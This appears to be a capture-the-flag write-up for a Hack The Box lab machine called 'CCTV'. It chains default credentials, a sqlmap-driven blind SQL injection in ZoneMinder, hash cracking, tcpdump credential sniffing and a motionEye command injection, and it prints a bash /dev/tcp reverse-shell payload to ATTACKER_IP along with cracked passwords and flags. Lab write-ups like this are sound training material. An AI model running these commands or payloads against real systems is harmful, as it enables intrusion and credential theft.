
# CCTV

## Box Info

- **Difficulty**: Easy
- **OS**: Linux
- **Date Completed**: 2026-03-11
- **IP Address**: 10.129.234.96

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA nmap/initial <IP>
```

**Results:**
- Port 22: OpenESSH 9.6p1
- Port 80: HTTP Apache httpd 2.4.58


### Web Enumeration
First thing I came across was a webpage that had a staff login button on the top right. Redirecting you to `http://cctv.htb/index=`. Here first thing to try was default credentials and `admin:admin` and we are in.

Here we land on a ZoneMinder CMS running version `v1.37.63` which has a known vulnerability to a time-based blind SQL injection payload. 
```bash
view=request&request=event&action=removetag&tid=1
```

---

## Exploitation  -  Initial Foothold

### The Plan

The plan here is to deploy the payload via `sqlmap` and hunt down the database credentials potentially leading to us either escalating privileges in the CMS or being able to get a SSH connection via one of the users directly. 

### Vulnerability

**Type**: Time-based blind SQL injection
**Location**: URL parameter
**Why it works**: This works because of the parameter `tid=1`. It was feeding directly into `TagID` with no sanitization. Then being passed to a `DELETE` query in the ZoneMinder's database. The reason it's `time-based blind` is because it never actually returns the data back to the page. So `sqlmap` can't actually read the characters directly, it had to deduce them, how?

For every character it basically says "`IF` character > 'M' `SLEEP` for 1 second". And it continues until it finds the correct character.

See Also: [[SQLmap]] | [[Hash-Cracking]]

### Steps

1: Discover the names of the available databases.
```bash
sqlmap --cookie="ZMSESSID=<SESSION_COOKIE>" -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --dbs --batch
```
**Result**: 
- `information_schema`
- `performance_schema`
- `zm`

2: Discover names of each table in the database.
```shell
sqlmap --cookie="ZMSESSID=<SESSION_COOKIE>" -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' -D zm --tables --batch
```
**Result**: Key tables we found. `Users` with `Password` and `Users` columns available.


3: Credential hunting in the `Users` table.
```shell
sqlmap --cookie="ZMSESSID=<SESSION_COOKIE>" -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' -D zm -T Users -C Username,Password --dump --batch --threads=10 --hex
```
**Result**: We found `Bcrypt` hashes.
superadmin: `$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm`
mark: `$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.`


---

## Privilege Escalation

See Also: [[Linux-Privilege-Escalation]] | [[Credential-Hunting]] | [[tcpdump]] | [[Shells]]

### Enumeration

After cracking mark's bcrypt hash with hashcat (`opensesame`), SSH access was established:
```bash
ssh mark@cctv.htb
```

First step post-foothold was checking internal listening services:
```bash
ss -tulnp
```

This revealed several non-standard ports listening on localhost including `8765` (motionEye) and `7999` (Motion daemon). No user flag was present in mark's home directory and `sudo -l` returned nothing useful.

The next step was sniffing internal traffic to check for cleartext credentials:
```bash
tcpdump -i any -nn -A tcp port 5000
```

**Result:** Cleartext credentials captured from internal traffic:

| Username | Password |
|----------|----------|
| sa_mark | `X1l9fx1ZjS7RZb` |

SSH'd in as `sa_mark` and retrieved the user flag.
user: `2c36b5db7378009d64eb8cb1c49aef08`

---

### Vulnerability

- **Type:** Cleartext credential exposure via internal traffic sniffing + motionEye CVE-2025-60787 command injection
- **Why it works:** The motionEye service on port 8765 takes user input from the web dashboard and writes it directly into Motion configuration files (`/etc/motioneye/camera-X.conf`) without sanitizing shell characters. When Motion processes the `picture_filename` directive it evaluates shell syntax like `$(command)`. Since the Motion daemon runs as root, injected commands execute with root privileges. The `sa_mark` credentials obtained via tcpdump worked on motionEye's admin interface because ZoneMinder's `AUTH_HASH_LOGINS` config governed the shared auth layer.

---

### Exploit

**1. Forward internal ports to local machine**
```bash
ssh -L 8765:127.0.0.1:8765 -L 7999:127.0.0.1:7999 mark@<TARGET_IP>
```

**2. Set up netcat listener**
```bash
nc -lvnp 4444
```

**3. Login to motionEye**

Navigate to `http://127.0.0.1:8765` and login with:
- Username: `admin`
- Password: `X1l9fx1ZjS7RZb`

**4. Bypass client-side JS validation in browser console (F12)**
```javascript
configUiValid = function() { return true; };
```

**5. Inject reverse shell payload into Still Images > Image File Name**
```
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```

**6. Set Capture Mode to Interval Snapshots with interval of 10 seconds and trigger snapshot**
```bash
curl "http://127.0.0.1:7999/1/action/snapshot"
```

Shell lands within 10 seconds as root.

**Root flag:**
```bash
cat /root/root.txt
```
root: `bdabead33437cf3bc3b5bf267d1c2970`
## Rabbit Holes

- Attempted to crack superadmin and admin bcrypt hashes  -  neither in rockyou
- Attempted `--os-shell` via sqlmap  -  failed due to insufficient MySQL FILE privileges
- Attempted webshell write via `SELECT INTO OUTFILE`  -  restricted to `/var/lib/mysql-files/`
- Attempted to modify ZoneMinder system config as admin  -  superadmin privileges required
- Attempted ZoneMinder auth hash login bypass  -  time-based hash component made it unreliable
- Spent significant time cracking hashes before pivoting to tcpdump

---

## Attack Chain Summary
```
admin:admin default creds on ZoneMinder web portal
      ↓
Time-based blind SQLi via tid parameter (sqlmap)
      ↓
Dumped Users table → bcrypt hashes
      ↓
Cracked mark's hash (opensesame) → SSH foothold as mark
      ↓
tcpdump on port 5000 → cleartext sa_mark credentials
      ↓
SSH as sa_mark → user flag
      ↓
sa_mark creds reused on motionEye admin (admin:X1l9fx1ZjS7RZb)
      ↓
CVE-2025-60787 filename injection → reverse shell as root
      ↓
Root flag
```

---

## Key Learnings

- Always run `ss -tulnp` immediately after foothold to enumerate internal services
- Always run `tcpdump` on internal interfaces to hunt for cleartext credentials
- bcrypt hashes not in rockyou don't mean a dead end  -  pivot to other attack vectors
- Client-side JS validation is never a security boundary  -  always bypassable via browser console
- Any unsanitized field that reaches a config file executed by a daemon is a potential injection point
- Session cookies expire during long sqlmap runs  -  always grab a fresh cookie if you get 401s

---

## Commands Reference
```bash
# Enumeration
nmap -sC -sV -oA nmap/initial <IP>
ss -tulnp
tcpdump -i any -nn -A tcp port 5000
cat /etc/motioneye/motion.conf

# Exploitation
sqlmap --cookie="ZMSESSID=<SESSION>" \
  -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
  --dbs --batch

sqlmap --cookie="ZMSESSID=<SESSION>" \
  -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
  -D zm --tables --batch

sqlmap --cookie="ZMSESSID=<SESSION>" \
  -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
  -D zm -T Users -C Username,Password --dump --batch --threads=10 --hex

hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

# Privilege Escalation
ssh -L 8765:127.0.0.1:8765 -L 7999:127.0.0.1:7999 mark@<TARGET_IP>
nc -lvnp 4444
curl "http://127.0.0.1:7999/1/action/snapshot"

# Flags
cat /home/sa_mark/user.txt
cat /root/root.txt
```

---

## Tags

`#htb` `#easy` `#linux` `#sqli` `#sqlmap` `#bcrypt` `#motioneye` `#command-injection` `#tcpdump` `#cleartext-creds` `#cve-2025-60787`